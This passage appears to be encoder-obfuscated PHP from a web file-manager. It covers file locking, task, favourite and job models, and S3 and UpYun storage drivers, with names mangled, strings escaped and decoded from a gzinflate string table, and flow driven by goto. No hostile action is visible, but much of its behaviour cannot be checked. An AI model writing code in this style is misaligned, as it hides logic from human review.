$GLOBALS[$Ìßù¬¼¢[857]][$©¦şŸ±ò] = !1; $“ù¯Ûê = fopen(DATA_PATH . $©¦şŸ±ò . $Ìßù¬¼¢[858], $Ìßù¬¼¢[859]); if (!$“ù¯Ûê) { return !1; } $GLOBALS[$Ìßù¬¼¢[857]][$©¦şŸ±ò] = $“ù¯Ûê; if (flock($“ù¯Ûê, LOCK_EX)) { return !0; } self::unlock($©¦şŸ±ò); show_json($Ìßù¬¼¢[860], !1); return !1; } public static function fileUnlock($ñŸ¼úÒ×) { $‘¨—•§š =& $_SERVER[ÏéâËõ‘]; $ñ¬âõ¿ = $GLOBALS[$‘¨—•§š[857]][$ñŸ¼úÒ×]; if (!$ñ¬âõ¿) { return; } $GLOBALS[$‘¨—•§š[857]][$ñŸ¼úÒ×] = !1; flock($ñ¬âõ¿, LOCK_UN); fclose($ñ¬âõ¿); } public static function fileUnlockAll() { $¯‹©Ğº =& $_SERVER[ÏéâËõ‘]; if (!$GLOBALS[$¯‹©Ğº[857]]) { return; } foreach ($GLOBALS[$¯‹©Ğº[857]] as $Åıµš†¸ => $òû²×¤ò) { if (!$òû²×¤ò) { continue; } $GLOBALS[$¯‹©Ğº[857]][$Åıµš†¸] = !1; flock($òû²×¤ò, LOCK_UN); fclose($òû²×¤ò); } $GLOBALS[$¯‹©Ğº[857]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ÆË³ÕÍ =& $_SERVER[ÏéâËõ‘]; $ŠŞÄÕ = $GLOBALS[$ÆË³ÕÍ[6]][$ÆË³ÕÍ[349]]; self::$cachePath = $ŠŞÄÕ[$ÆË³ÕÍ[199]][$ÆË³ÕÍ[84]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($«Ñ™Ş†, $¿¿¤·÷ê = 0) { $÷î¡µ™¦ =& $_SERVER[ÏéâËõ‘]; $Ëü©¹õ = microtime(!0); $±ö“Àº¼ = $Ëü©¹õ + $¿¿¤·÷ê + 0.0001; $Íîé›¬ğ = rtrim(self::$cachePath, $÷î¡µ™¦[8]) . $÷î¡µ™¦[861] . md5($«Ñ™Ş†) . $÷î¡µ™¦[858]; if (file_exists($Íîé›¬ğ) && filemtime($Íîé›¬ğ) && filemtime($Íîé›¬ğ) < time() - 10) { @unlink($Íîé›¬ğ); } do { if (file_exists($Íîé›¬ğ)) { cacheLockWait(); continue; } $´ï¿ĞÎü = fopen($Íîé›¬ğ, $÷î¡µ™¦[862]); if (!$´ï¿ĞÎü) { return !1; } $¾íôæïâ = flock($´ï¿ĞÎü, LOCK_EX | LOCK_NB); self::$caches[$«Ñ™Ş†] = array($÷î¡µ™¦[863] => $´ï¿ĞÎü, $÷î¡µ™¦[199] => $Íîé›¬ğ); fwrite($´ï¿ĞÎü, $±ö“Àº¼); clearstatcache(); if ($´ï¿ĞÎü && $¾íôæïâ) { return !0; } cacheLockWait(); } while (microtime(!0) < $±ö“Àº¼); $this->unlock($«Ñ™Ş†); return !1; } public function lockGet($ÖÆ¥½Î¿) { $óü¦ÄïÖ =& $_SERVER[ÏéâËõ‘]; $Ç×àÂ¶ = rtrim(self::$cachePath, $óü¦ÄïÖ[8]) . $óü¦ÄïÖ[861] . md5($ÖÆ¥½Î¿) . $óü¦ÄïÖ[858]; return file_exists($Ç×àÂ¶); } public function unlock($¬¤ùÒñ) { $‘°£’ =& $_SERVER[ÏéâËõ‘]; $’Ûê¿ì‚ = self::$caches[$¬¤ùÒñ]; if (!$’Ûê¿ì‚) { return; } @flock($’Ûê¿ì‚[$‘°£’[863]], LOCK_UN); @fclose($’Ûê¿ì‚[$‘°£’[863]]); @unlink($’Ûê¿ì‚[$‘°£’[199]]); unset(self::$caches[$¬¤ùÒñ]); } } goto b–ğ‰ôÖ³Ü; e¨Š§®¦…: class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\155\56\x74\141\163\x6b\x4c\x69\x73\164"; public $field = array("\x6e\x61\x6d\145", "\x74\171\x70\145", "\x65\x76\x65\x6e\x74", "\164\x69\x6d\145", "\x64\x65\x73\143", "\163\x79\163\x74\145\x6d", "\145\156\x61\x62\154\145", "\154\x61\163\164\122\x75\x6e", "\163\x6f\162\x74"); public function listData($’¢Õ¸œ‡ = false, $¯Î¬â†ú = "\163\157\162\164", $Œõ€Ù»á = false) { return parent::listData($’¢Õ¸œ‡, $¯Î¬â†ú, $Œõ€Ù»á); } public function add($†ÏŞœ¹š) { $åóôÌ¯ä =& $_SERVER[ÏéâËõ‘]; $Õ¦ğÊšÕ = $this->findByName($†ÏŞœ¹š[$åóôÌ¯ä[32]]); if ($Õ¦ğÊšÕ) { return !1; } $†ÏŞœ¹š[$åóôÌ¯ä[1622]] = 0; $†ÏŞœ¹š[$åóôÌ¯ä[1858]] = $this->getSort(); return parent::insert($†ÏŞœ¹š); } private function getSort() { $çâ½íöé =& $_SERVER[ÏéâËõ‘]; $Ü ş½‚á = parent::listData(); $àş±Øã¤ = array_to_keyvalue($Ü ş½‚á, $çâ½íöé[12], $çâ½íöé[1858]); return empty($àş±Øã¤) ? 0 : max($àş±Øã¤) + 1; } public function update($¥ôîÇŸñ, $ë¤“¢Îâ) { $Ë°—ÄÁƒ =& $_SERVER[ÏéâËõ‘]; $ıåÀ­ìğ = $this->listData($¥ôîÇŸñ); $çèø•ú = $this->findByName($ë¤“¢Îâ[$Ë°—ÄÁƒ[32]]); if (!$ıåÀ­ìğ || $çèø•ú && $çèø•ú[$Ë°—ÄÁƒ[399]] != $ıåÀ­ìğ[$Ë°—ÄÁƒ[399]]) { return !1; } return parent::update($¥ôîÇŸñ, $ë¤“¢Îâ); } public function remove($©“ èè, $—Ş‘“Ë£ = false) { $ğ¼ŞË•ë =& $_SERVER[ÏéâËõ‘]; $È÷Ë½€é = $this->listData($©“ èè); if (!$È÷Ë½€é) { return; } if (!$—Ş‘“Ë£ && $È÷Ë½€é[$ğ¼ŞË•ë[1281]] == $ğ¼ŞË•ë[88]) { return !1; } return parent::remove($©“ èè); } public function enable($‘ŸÂŞ·¥, $±òÕı§) { return $this->update($‘ŸÂŞ·¥, array($_SERVER[ÏéâËõ‘][2261] => $±òÕı§)); } public function run($‹ Ÿ¹¶±) { return $this->update($‹ Ÿ¹¶±, array($_SERVER[ÏéâËõ‘][2273] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\163\x65\x72\x5f\x66\x61\x76"; protected function cacheFunctionAlias($ğ‚°Öœë) { $ßæÛÌ© =& $_SERVER[ÏéâËõ‘]; return array($ßæÛÌ©[1945] => array(USER_ID, $ßæÛÌ©[2274])); } protected function listData() { $òš™õ¯û =& $_SERVER[ÏéâËõ‘]; $’¾½øšù = array($òš™õ¯û[1653] => USER_ID, $òš™õ¯û[484] => 0); $ŒîÒ•  = $òš™õ¯û[2275]; $‹ç‚°©í = $this->field($ŒîÒ• )->where($’¾½øšù)->order($òš™õ¯û[2276])->select(); return $‹ç‚°©í ? $‹ç‚°©í : array(); } protected function resetCache() { } protected function listView() { $¹ğÖ½¹­ =& $_SERVER[ÏéâËõ‘]; $¸åé»Ş· = $this->listData(); $Çô«©‡‘ = array_filter_by_field($¸åé»Ş·, $¹ğÖ½¹­[33], $¹ğÖ½¹­[416]); $ûÌ·ÇâÀ = array_to_keyvalue($Çô«©‡‘, $¹ğÖ½¹­[12], $¹ğÖ½¹­[84]); if (!$ûÌ·ÇâÀ) { return $¸åé»Ş·; } $ïò±ú¤ = 2000; $ª©…¾ñÖ = array($¹ğÖ½¹­[417] => array($¹ğÖ½¹­[418], $ûÌ·ÇâÀ)); $êÃÅ•ŒÍ = Model($¹ğÖ½¹­[827])->listSource($ª©…¾ñÖ, $ïò±ú¤); $êÃÅ•ŒÍ = array_merge($êÃÅ•ŒÍ[$¹ğÖ½¹­[83]], $êÃÅ•ŒÍ[$¹ğÖ½¹­[82]]); $êÃÅ•ŒÍ = array_to_keyvalue($êÃÅ•ŒÍ, $¹ğÖ½¹­[402]); foreach ($¸åé»Ş· as $ùß‘–à => $œòÏğ½¹) { $°‘åê”² = $êÃÅ•ŒÍ[$œòÏğ½¹[$¹ğÖ½¹­[84]]]; $°‘åê”² = $°‘åê”² ? $°‘åê”² : array(); $¸åé»Ş·[$ùß‘–à] = array_merge($°‘åê”², $œòÏğ½¹); } return $¸åé»Ş·; } protected function addFav($öúÓÛ­, $Ÿ‚ç§ä³ = '', $åª¿ Æœ = "\x73\x6f\165\x72\143\x65") { $Ó³ˆÀ”¹ =& $_SERVER[ÏéâËõ‘]; $Ôóãî–å = array($Ó³ˆÀ”¹[1653] => USER_ID, $Ó³ˆÀ”¹[484] => 0, $Ó³ˆÀ”¹[422] => $åª¿ Æœ, $Ó³ˆÀ”¹[421] => $öúÓÛ­); if ($this->where($Ôóãî–å)->find()) { return !1; } $Ôóãî–å = array($Ó³ˆÀ”¹[1653] => USER_ID, $Ó³ˆÀ”¹[484] => 0); $âëüòœ = $this->where($Ôóãî–å)->max($Ó³ˆÀ”¹[1858]); if (!$âëüòœ) { $âëüòœ = 0; } if (!$Ÿ‚ç§ä³ && $åª¿ Æœ == $Ó³ˆÀ”¹[416]) { $È—¦€€í = Model($Ó³ˆÀ”¹[1332])->where(array($Ó³ˆÀ”¹[417] => $öúÓÛ­))->find(); if (!$È—¦€€í) { return !1; } $Ÿ‚ç§ä³ = $È—¦€€í[$Ó³ˆÀ”¹[32]]; } $Ÿ‚ç§ä³ = $this->getAutoName($Ÿ‚ç§ä³); $ñÏüüôè = array($Ó³ˆÀ”¹[1653] => USER_ID, $Ó³ˆÀ”¹[484] => 0, $Ó³ˆÀ”¹[420] => $Ÿ‚ç§ä³, $Ó³ˆÀ”¹[421] => $öúÓÛ­, $Ó³ˆÀ”¹[422] => $åª¿ Æœ, $Ó³ˆÀ”¹[1838] => $âëüòœ + 1); return $this->add($ñÏüüôè); } protected function remove($ƒı‰€ñ™) { $…ù¹â¼ó =& $_SERVER[ÏéâËõ‘]; $æò¡Õë‘ = array($…ù¹â¼ó[1653] => USER_ID, $…ù¹â¼ó[419] => $ƒı‰€ñ™); return $this->where($æò¡Õë‘)->delete(); } protected function removeByName($éØ†èç) { $Ô›·Óù” =& $_SERVER[ÏéâËõ‘]; $öÑ²Şà = array($Ô›·Óù”[1653] => USER_ID, $Ô›·Óù”[420] => $éØ†èç, $Ô›·Óù”[484] => 0); return $this->where($öÑ²Şà)->delete(); } protected function rename($àÒœ¹ÈŸ, $Š¦Ù¨îš) { $ÚÚğ¹…Ì =& $_SERVER[ÏéâËõ‘]; if ($àÒœ¹ÈŸ == $Š¦Ù¨îš) { return !1; } $¨Ûë¥Œ = $this->getAutoName($Š¦Ù¨îš); if ($Š¦Ù¨îš != $¨Ûë¥Œ) { return !1; } $ÔĞÌİŠ† = array($ÚÚğ¹…Ì[1653] => USER_ID, $ÚÚğ¹…Ì[484] => 0, $ÚÚğ¹…Ì[32] => $àÒœ¹ÈŸ); return $this->where($ÔĞÌİŠ†)->save(array($ÚÚğ¹…Ì[32] => $Š¦Ù¨îš)); } protected function resetSort($…òÁŒé£) { $¸ïÔè’Ê =& $_SERVER[ÏéâËõ‘]; $…òÁŒé£ = is_array($…òÁŒé£) ? $…òÁŒé£ : array(); $ùú²šÃö = array($¸ïÔè’Ê[1653] => USER_ID); for ($€’Ó“šÚ = 0; $€’Ó“šÚ < count($…òÁŒé£); $€’Ó“šÚ++) { $ùú²šÃö[$¸ïÔè’Ê[419]] = $…òÁŒé£[$€’Ó“šÚ]; $this->where($ùú²šÃö)->save(array($¸ïÔè’Ê[1838] => $€’Ó“šÚ + 1)); } return !0; } protected function moveTop($‹ŞÎ©æñ) { $˜éßõ© =& $_SERVER[ÏéâËõ‘]; $ÁÊè÷”Š = array($˜éßõ©[1653] => USER_ID, $˜éßõ©[484] => 0); $Á©¶ú¡Ã = $this->where($ÁÊè÷”Š)->where(array($˜éßõ©[32] => $‹ŞÎ©æñ))->find(); if (!$Á©¶ú¡Ã) { return; } $Ú…ƒ•ı = $this->field($˜éßõ©[399])->where($ÁÊè÷”Š)->order($˜éßõ©[2276])->select(); $Ú…ƒ•ı = array_to_keyvalue($Ú…ƒ•ı, $˜éßõ©[12], $˜éßõ©[399]); $áÁÅûÂ¢ = $Ú…ƒ•ı; $Ú…ƒ•ı = array_remove_value($Ú…ƒ•ı, $Á©¶ú¡Ã[$˜éßõ©[399]]); array_unshift($Ú…ƒ•ı, $Á©¶ú¡Ã[$˜éßõ©[399]]); return $this->resetSort($Ú…ƒ•ı); } protected function moveBottom($ÜæİÁ¹³) { $ÇµşŞ¸ü =& $_SERVER[ÏéâËõ‘]; $ñ²‡Ú¶ = array($ÇµşŞ¸ü[1653] => USER_ID, $ÇµşŞ¸ü[484] => 0); $§·¿£¤« = $this->where($ñ²‡Ú¶)->max($ÇµşŞ¸ü[1858]); $ë—Ô‹Öö = array($ÇµşŞ¸ü[1858] => $§·¿£¤« + 1); return $this->where($ñ²‡Ú¶)->where(array($ÇµşŞ¸ü[32] => $ÜæİÁ¹³))->save($ë—Ô‹Öö); } private function getAutoName($«··ûÆ) { $ÌÌÇ é =& $_SERVER[ÏéâËõ‘]; $ù­ÆŞó = array($ÌÌÇ é[1653] => USER_ID, $ÌÌÇ é[484] => 0); $óèßÚŸê = $this->field($ÌÌÇ é[32])->where($ù­ÆŞó)->select(); $óèßÚŸê = array_to_keyvalue($óèßÚŸê, $ÌÌÇ é[12], $ÌÌÇ é[32]); if (!$óèßÚŸê || !in_array($«··ûÆ, $óèßÚŸê)) { return $«··ûÆ; } for ($©¿¶ŠÎà = 0; $©¿¶ŠÎà < count($óèßÚŸê); $©¿¶ŠÎà++) { if (!in_array($«··ûÆ . "\x28{$©¿¶ŠÎà}\51", $óèßÚŸê)) { return $«··ûÆ . "\50{$©¿¶ŠÎà}\x29"; } } return $«··ûÆ . "\x28{$©¿¶ŠÎà}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\x6d\x2e\152\157\x62\114\151\163\164"; public $field = array("\x6e\x61\155\x65", "\x64\x65\163\143", "\x73\x6f\x72\x74"); const JOB_KEY = "\x73\x65\154\x66\x4a\157\x62\114\x69\x73\x74"; public function listData($¢°æÏĞª = false, $ˆÚÑÓşô = "\163\x6f\x72\164", $çşÈÑ†ª = false) { return parent::listData($¢°æÏĞª, $ˆÚÑÓşô, $çşÈÑ†ª); } public function remove($¯¯×ª¯‡) { return parent::remove($¯¯×ª¯‡); } public function add($”¢ê¡ªì) { $§úÓ÷Âš =& $_SERVER[ÏéâËõ‘]; if ($this->findByName($”¢ê¡ªì[$§úÓ÷Âš[32]])) { return !1; } $”¢ê¡ªì[$§úÓ÷Âš[1858]] = $this->getSort(); return parent::insert($”¢ê¡ªì); } private function getSort() { $œ¸Ä÷Ç¦ =& $_SERVER[ÏéâËõ‘]; $Úûéˆî = parent::listData(); $½­šÕ’Ë = array_to_keyvalue($Úûéˆî, $œ¸Ä÷Ç¦[12], $œ¸Ä÷Ç¦[1858]); return empty($½­šÕ’Ë) ? 0 : max($½­šÕ’Ë) + 1; } public function update($òğ¥ıã€, $ÖÎ«ìª–) { $„Å Öî¶ =& $_SERVER[ÏéâËõ‘]; $á‰Ê¢«£ = parent::listData($òğ¥ıã€); $ãÆìÓ°” = $this->findByName($ÖÎ«ìª–[$„Å Öî¶[32]]); if (!$á‰Ê¢«£ || $ãÆìÓ°” && $ãÆìÓ°”[$„Å Öî¶[399]] != $á‰Ê¢«£[$„Å Öî¶[399]]) { return !1; } return parent::update($òğ¥ıã€, $ÖÎ«ìª–); } public function setUserJob($ÙÆíöù§, $†¼€“¬à) { $®¢´­Î² =& $_SERVER[ÏéâËõ‘]; if (!is_array($†¼€“¬à)) { $†¼€“¬à = array($†¼€“¬à); } $‚îÕ›¾• = parent::listData(); $šÌş‰½ª = array_to_keyvalue($‚îÕ›¾•, $®¢´­Î²[32]); $ûù¢¶Õ• = $®¢´­Î²[378]; foreach ($†¼€“¬à as $‚Š„ÜÉ£) { if ($šÌş‰½ª[$‚Š„ÜÉ£]) { $ûù¢¶Õ• .= $šÌş‰½ª[$‚Š„ÜÉ£][$®¢´­Î²[399]] . $®¢´­Î²[50]; } else { $°Ç§Š²å = $this->add($‚Š„ÜÉ£); $ûù¢¶Õ• .= $°Ç§Š²å . $®¢´­Î²[50]; } } $ûù¢¶Õ• = rtrim($ûù¢¶Õ•, $®¢´­Î²[50]); Model($®¢´­Î²[535])->metaSet($ÙÆíöù§, self::JOB_KEY, $ûù¢¶Õ•); } public function getUserJob($Çé­¹ê†) { $•‡š”­ƒ = Model($_SERVER[ÏéâËõ‘][535])->metaGet($Çé­¹ê†); return $this->getUserJobInfo($•‡š”­ƒ[self::JOB_KEY]); } public function getUserJobInfo($•ÎŠÕ€) { $Ô¸Ì°èÌ =& $_SERVER[ÏéâËõ‘]; $Ø«Ï‡¢ = explode($Ô¸Ì°èÌ[50], $•ÎŠÕ€); $¥Æì¤ƒâ = parent::listData(); $¥Æì¤ƒâ = array_remove_key($¥Æì¤ƒâ, $Ô¸Ì°èÌ[200]); $ñ°Í¾“ò = array(); foreach ($Ø«Ï‡¢ as $À±“í) { if (isset($¥Æì¤ƒâ[$À±“í])) { $ñ°Í¾“ò[] = $¥Æì¤ƒâ[$À±“í]; } } return $ñ°Í¾“ò; } } goto aè„÷Œ ²; e“¹Ë‰ËÊ¡: define($_SERVER[ÏéâËõ‘][0], $_SERVER[ÏéâËõ‘][1]); $_SERVER[ûˆ¼±‹ù] = explode($_SERVER[ÏéâËõ‘][2], gzinflate(substr($_SERVER[ÏéâËõ‘][3], 10, -8))); function binCheckEq($Òç¹Æ¼Æ, $ü–¶ëğà) { return $Òç¹Æ¼Æ == $ü–¶ëğà; } goto e½ó”¤…µ; C«×°»ùÈÏ: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($‡ğ©ËùŞ) { parent::__construct($‡ğ©ËùŞ); } public function uploadFormData($Ì¹Ù‘·Ï, $ï¯Üåß = 3600) { $‘·„›óÄ =& $_SERVER[ÏéâËõ‘]; $®¼ë¬ˆ = $‘·„›óÄ[198]; $Ã³Œ£¬ = $‘·„›óÄ[1352]; $è¿â‹îÒ = $‘·„›óÄ[62]; $±şâÔ½ = gmdate($‘·„›óÄ[1353]); $ğÊãÆ = gmdate($‘·„›óÄ[753]); $Ìú¡–ÕĞ = $‘·„›óÄ[1354]; $Ã‚ÜÉÆÒ = $ï¯Üåß . $‘·„›óÄ[12]; $»ÉãÑ¦É = $‘·„›óÄ[1315]; $ıÙÎ¦ªÙ = array($this->accessKey, $ğÊãÆ, $this->region, $è¿â‹îÒ, $Ìú¡–ÕĞ); $¼ı¸¶ª÷ = implode($‘·„›óÄ[8], $ıÙÎ¦ªÙ); $ÓğÛö­ = array($‘·„›óÄ[1317] => gmdate($‘·„›óÄ[1316], strtotime($‘·„›óÄ[1355])), $‘·„›óÄ[1318] => array(array($‘·„›óÄ[1320] => $this->bucket), array($‘·„›óÄ[1319] => $®¼ë¬ˆ), array($‘·„›óÄ[1321], $‘·„›óÄ[1322], $‘·„›óÄ[12]), array($‘·„›óÄ[1321], $‘·„›óÄ[1356], $‘·„›óÄ[12]), array($‘·„›óÄ[1321], $‘·„›óÄ[1357], $‘·„›óÄ[12]), array($‘·„›óÄ[1323] => $»ÉãÑ¦É), array($‘·„›óÄ[1358] => $¼ı¸¶ª÷), array($‘·„›óÄ[1359] => $Ã³Œ£¬), array($‘·„›óÄ[1360] => $±şâÔ½), array($‘·„›óÄ[1361] => $Ã‚ÜÉÆÒ))); $¤ÈõÚ–Ã = base64_encode(json_encode($ÓğÛö­)); $ éÌ‰Á“ = hash_hmac($‘·„›óÄ[1362], $ğÊãÆ, $‘·„›óÄ[1363] . $this->secret, !0); $àî´×õó = hash_hmac($‘·„›óÄ[1362], $this->region, $ éÌ‰Á“, !0); $Ñ¸¤¹È™ = hash_hmac($‘·„›óÄ[1362], $è¿â‹îÒ, $àî´×õó, !0); $¹ÀßÏ×ü = hash_hmac($‘·„›óÄ[1362], $Ìú¡–ÕĞ, $Ñ¸¤¹È™, !0); $ĞÑğ• = hash_hmac($‘·„›óÄ[1362], $¤ÈõÚ–Ã, $¹ÀßÏ×ü); $Ì­ğï ş = array($‘·„›óÄ[215] => $‘·„›óÄ[12], $‘·„›óÄ[1364] => $‘·„›óÄ[12], $‘·„›óÄ[1319] => $®¼ë¬ˆ, $‘·„›óÄ[1323] => $»ÉãÑ¦É, $‘·„›óÄ[1327] => $¤ÈõÚ–Ã, $‘·„›óÄ[1365] => $¼ı¸¶ª÷, $‘·„›óÄ[1366] => $Ã³Œ£¬, $‘·„›óÄ[1367] => $±şâÔ½, $‘·„›óÄ[1368] => $Ã‚ÜÉÆÒ, $‘·„›óÄ[1369] => $ĞÑğ•, $‘·„›óÄ[181] => $this->getHost()); return $Ì­ğï ş; } public function multiUploadFormData($¨­·Íäø, $ñ ƒìãã = 3600) { $áş©•ƒè =& $_SERVER[ÏéâËõ‘]; $¬å¦Œ×Ñ = gmdate($áş©•ƒè[1448]); $Êõ•¹Ò¨ = array(); $Ø€ò­ì = $this->client->getUploadId($this->bucket, $¨­·Íäø, $Êõ•¹Ò¨); if (!$Ø€ò­ì) { return !1; } return array($áş©•ƒè[223] => $Ø€ò­ì, $áş©•ƒè[181] => $this->getHost() . $áş©•ƒè[8] . $this->pathEncode($¨­·Íäø), $áş©•ƒè[224] => $¬å¦Œ×Ñ, $áş©•ƒè[94] => $¨­·Íäø); } public function multiUploadAuthData($û™ Ğù”, $ßäºÆ¯Ş = array()) { $ÌĞ„°Æß =& $_SERVER[ÏéâËõ‘]; $½‡†Ûµã = isset($ßäºÆ¯Ş[$ÌĞ„°Æß[174]]) ? $ßäºÆ¯Ş[$ÌĞ„°Æß[174]] : $ÌĞ„°Æß[12]; $¯©‡´Ê› = $ßäºÆ¯Ş[$ÌĞ„°Æß[94]]; unset($ßäºÆ¯Ş[$ÌĞ„°Æß[94]]); if (isset($ßäºÆ¯Ş[$ÌĞ„°Æß[225]])) { return $this->listUploadParts($¯©‡´Ê›, $ßäºÆ¯Ş); } $äÍ¯»˜… = array(); if (isset($ßäºÆ¯Ş[$ÌĞ„°Æß[1449]])) { $äÍ¯»˜…[$ÌĞ„°Æß[1450]] = $ßäºÆ¯Ş[$ÌĞ„°Æß[1449]]; } $Ò×Ã–² = explode($ÌĞ„°Æß[183], $this->getHost()); $÷ËüÃ² = array($ÌĞ„°Æß[1451] => $Ò×Ã–²[1], $ÌĞ„°Æß[1452] => $ÌĞ„°Æß[12], $ÌĞ„°Æß[215] => $ÌĞ„°Æß[120], $ÌĞ„°Æß[1364] => $ßäºÆ¯Ş[$ÌĞ„°Æß[76]]); $š¼Ú™“ƒ = $ÌĞ„°Æß[228]; $åøöÄñû = $ÌĞ„°Æß[8] . $this->pathEncode($¯©‡´Ê›) . $½‡†Ûµã; $À÷Øº¯ş = $this->client->__getSignatureV4($äÍ¯»˜…, $÷ËüÃ², $š¼Ú™“ƒ, $åøöÄñû); if (strpos($½‡†Ûµã, $ÌĞ„°Æß[227]) === 0) { if (isset($äÍ¯»˜…[$ÌĞ„°Æß[1450]])) { $æíêÉ¢Æ = $äÍ¯»˜…[$ÌĞ„°Æß[1450]]; } else { if (isset($À÷Øº¯ş[$ÌĞ„°Æß[1450]])) { $æíêÉ¢Æ = $À÷Øº¯ş[$ÌĞ„°Æß[1450]]; } else { $æíêÉ¢Æ = hash($ÌĞ„°Æß[1362], $ÌĞ„°Æß[12]); } } return array($ÌĞ„°Æß[234] => $À÷Øº¯ş[$ÌĞ„°Æß[234]], $ÌĞ„°Æß[1450] => $æíêÉ¢Æ, $ÌĞ„°Æß[224] => $À÷Øº¯ş[$ÌĞ„°Æß[1453]]); } return $À÷Øº¯ş[$ÌĞ„°Æß[234]]; } public function listUploadParts($ß‡ã·Í, $¹Õáø = array()) { $¿—µ‚±² =& $_SERVER[ÏéâËõ‘]; $ì¸ş¸Îæ = str_replace($¿—µ‚±²[235], $¿—µ‚±²[12], $¹Õáø[$¿—µ‚±²[174]]); $ï‚½¬§¼ = $this->client->listParts($this->bucket, $ß‡ã·Í, $ì¸ş¸Îæ); if (!$ï‚½¬§¼) { return !1; } $ï‹ÃÇØ× = $¿—µ‚±²[1454]; foreach ($ï‚½¬§¼ as $İş¼´€¦) { $ï‹ÃÇØ× .= $¿—µ‚±²[1455] . "\74\x50\x61\162\164\116\x75\155\x62\x65\x72\76{$İş¼´€¦[$¿—µ‚±²[1409]]}\74\57\120\x61\162\164\x4e\x75\155\142\x65\162\x3e\12" . "\74\105\x54\x61\x67\76{$İş¼´€¦[$¿—µ‚±²[1410]]}\x3c\x2f\105\x54\x61\x67\76\12" . $¿—µ‚±²[1456]; } $ï‹ÃÇØ× .= $¿—µ‚±²[1457]; $şõÄÀ»Ğ = array(); $äßò¥¶© = explode($¿—µ‚±²[183], $this->getHost()); $¼©Ëäü§ = array($¿—µ‚±²[1451] => $äßò¥¶©[1], $¿—µ‚±²[215] => $¿—µ‚±²[120], $¿—µ‚±²[1364] => strlen($ï‹ÃÇØ×)); $üšç»„¡ = $¿—µ‚±²[226]; $Ü¾Ì°À© = $¿—µ‚±²[8] . $this->pathEncode($ß‡ã·Í) . $¹Õáø[$¿—µ‚±²[174]]; $Àãú¯Ğ¤ = $this->client->__getSignatureV4($şõÄÀ»Ğ, $¼©Ëäü§, $üšç»„¡, $Ü¾Ì°À©, $ï‹ÃÇØ×); return array($¿—µ‚±²[234] => $Àãú¯Ğ¤[$¿—µ‚±²[234]], $¿—µ‚±²[224] => $Àãú¯Ğ¤[$¿—µ‚±²[1453]], $¿—µ‚±²[236] => $ï‚½¬§¼, $¿—µ‚±²[1450] => $Àãú¯Ğ¤[$¿—µ‚±²[1450]]); } public function link($ß¯ÃÓ¯‘, $ğŞİ®ò´ = array()) { return parent::link($ß¯ÃÓ¯‘, $ğŞİ®ò´); } public function fileOut($©éãİÊ, $ãÌ¶§òà = false, $ñÆ÷ß‘€ = false, $Ë©ù¯±Õ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ÏéâËõ‘][1458])) { return parent::fileOutServer($©éãİÊ, $ãÌ¶§òà, $ñÆ÷ß‘€, $Ë©ù¯±Õ); } parent::fileOut($©éãİÊ, $ãÌ¶§òà, $ñÆ÷ß‘€, $Ë©ù¯±Õ); } public function fileOutImage($—ıä¹ƒ‰, $ó·¬›Ë = 250) { if (strstr($this->endpoint, $_SERVER[ÏéâËõ‘][1458])) { return parent::fileOutImageServer($—ıä¹ƒ‰, $ó·¬›Ë); } parent::fileOutImage($—ıä¹ƒ‰, $ó·¬›Ë); } public function fileOutLink($Ğ¼¢š„—) { $¿£½¸ =& $_SERVER[ÏéâËõ‘]; if (substr($Ğ¼¢š„—, 0, 7) == $¿£½¸[1330]) { $Ğ¼¢š„— = $¿£½¸[1331] . substr($Ğ¼¢š„—, 7); } header($¿£½¸[161] . $Ğ¼¢š„—); die; } public function getHost() { $¶ˆ¬€–ß =& $_SERVER[ÏéâËõ‘]; $•ññš· = str_rtrim(parent::getHost(), $¶ˆ¬€–ß[8] . $this->bucket); $•ññš· = explode($¶ˆ¬€–ß[183], $•ññš·); return $•ññš·[0] . $¶ˆ¬€–ß[183] . $this->bucket . $¶ˆ¬€–ß[10] . $•ññš·[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($©šªÚ±Ñ, $‘µ“Ô²Ã = 0) { parent::__construct(); $this->source = $©šªÚ±Ñ; $this->sourceSize = $‘µ“Ô²Ã; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($Ñã¥«£ = false) { return $this->sourceSize; } public function getContent($úò€¹¬„ = false) { return $this->fileSubstr($úò€¹¬„, 0, $this->sourceSize); } public function fileSubstr($ğßØÅ°‚ = false, $¸¢ìÕ€î = 0, $ÒÇ¸Ğúñ = 0) { if (!$ÒÇ¸Ğúñ) { $ÒÇ¸Ğúñ = $this->sourceSize; } $¯íıªâ¢ = $this->sourceSize - $¸¢ìÕ€î; if ($ÒÇ¸Ğúñ >= $¯íıªâ¢) { $ÒÇ¸Ğúñ = $¯íıªâ¢; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $¸¢ìÕ€î, $ÒÇ¸Ğúñ); } if ($this->sourceType == self::TYPE_FILE) { if ($ÒÇ¸Ğúñ <= 0) { return $_SERVER[ÏéâËõ‘][12]; } $©Äü‡şş = ftell($this->source); fseek_64($this->source, $©Äü‡şş + $¸¢ìÕ€î); $ğÏ±¿ş = @fread($this->source, $ÒÇ¸Ğúñ); fseek_64($this->source, $©Äü‡şş); return $ğÏ±¿ş; } } public function hashMd5($ƒ­Äíü³ = false) { return md5($this->getContent()); } public static function hash($ÄÉâûÅ´, $ü‹˜¼²Á = 0) { $Ñ†Üë™• = new PathDriverStream($ÄÉâûÅ´, $ü‹˜¼²Á); return $Ñ†Üë™•->hashSimple($ÄÉâûÅ´); } public static function md5($¸‰Ã”¶÷, $’¥âÓ¯Ë = 0) { $çì«„íÄ = new PathDriverStream($¸‰Ã”¶÷, $’¥âÓ¯Ë); return $çì«„íÄ->hashMd5($¸‰Ã”¶÷); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\x74\160\72\57\57\x76\60\56\x61\160\x69\56\x75\x70\x79\x75\156\x2e\143\157\x6d"; public $ioUploadServer = 0; public 